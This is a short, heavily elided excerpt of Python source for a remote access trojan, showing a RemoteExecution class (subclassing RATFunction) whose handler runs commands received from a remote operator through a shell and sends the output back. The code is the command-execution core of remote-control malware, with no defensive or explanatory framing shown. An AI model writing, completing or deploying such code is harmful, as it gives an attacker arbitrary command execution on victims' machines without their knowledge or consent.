...
class RemoteExecution(RATFunction):
    ...
    def send_command_output(self, output, err=False):
    ...
    def handle_packet_remote_side(self, data):
        ...
        try:
            output = subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            self.send_command_output(output)
            print(output)
        except subprocess.CalledProcessError as e:
            output = e.output
            self.send_command_output(output, True)
            print(output)
